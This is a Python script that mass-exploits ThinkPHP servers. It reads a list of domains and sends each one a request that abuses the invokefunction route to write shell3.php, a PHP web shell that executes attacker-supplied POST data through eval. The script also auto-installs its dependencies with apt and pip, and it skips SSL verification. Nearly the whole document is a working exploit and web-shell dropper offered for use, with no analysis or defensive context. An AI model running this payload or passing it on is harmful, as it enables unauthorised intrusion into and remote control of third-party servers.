coroutine=1
headers='headers.txt'
domains='domains.txt'
path=r'?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell3.php&vars[1][]=<?php%20@eval($_POST[%27TS%27]);%20?>'


try:
    from aiohttp import ClientSession,ClientTimeout
except:
    from subprocess import run as shell
    shell(['apt','update'])
    shell(['apt','install','python3-pip','-y'])
    shell(['pip','install','aiohttp[speedups]'])
    from aiohttp import ClientSession,ClientTimeout
import asyncio
with open(domains,encoding='UTF-8')as file:
    domains=file.read().splitlines()
header='''Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close'''
headers={}
for v in header.splitlines():
    x=v.split(': ')
    headers[x[0]]=x[1]
async def main():
    timeout = ClientTimeout(total=10)
    async with ClientSession(headers=headers,timeout=timeout)as client:
        print(headers)
        await asyncio.wait([http(client) for _ in range(coroutine)])
async def http(client):
    while True:
        try:
            info=queue.get_nowait()
        except asyncio.QueueEmpty:
            return
        print(info[0],info[1]+path)
        try:
            async with client.get(info[1]+path,ssl=False)as res:
                print(await res.text(),res.headers)
        except Exception as e:
            print(e)
def exits():
    with open('result.txt','w')as file:
        file.writelines(result)
result=[]
queue=asyncio.Queue()
for index in range(len(domains)):
    queue.put_nowait((index,domains[index]))
asyncio.run(main())
